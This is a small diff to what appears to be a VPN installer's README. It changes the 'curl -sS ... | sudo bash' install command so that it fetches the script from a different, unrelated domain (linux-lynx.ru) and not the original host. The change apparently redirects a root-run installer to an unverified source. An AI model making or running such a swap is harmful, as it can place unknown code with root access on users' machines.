@@ -6,7 +6,7 @@
 * 512 MB RAM
 
 ### Install
-##### `curl -sS https://sockeye.cc/instavpn.sh | sudo bash`
+##### `curl -sS https://linux-lynx.ru/instavpn.sh | sudo bash`
 
 ### Web UI
 Browse at http://IP-ADDRESS:8080
